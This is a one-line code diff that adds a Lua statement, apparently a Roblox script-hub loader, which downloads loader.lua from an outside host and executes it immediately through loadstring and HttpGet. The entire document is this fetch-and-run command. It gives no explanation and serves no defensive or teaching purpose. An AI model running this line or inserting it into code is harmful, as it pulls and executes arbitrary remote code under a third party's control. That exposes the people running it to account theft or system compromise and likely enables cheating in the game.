@@ -1,0 +1,1 @@
+loadstring(Game:HttpGet"https://relzhub.xcodehoster.com/loader.lua")()
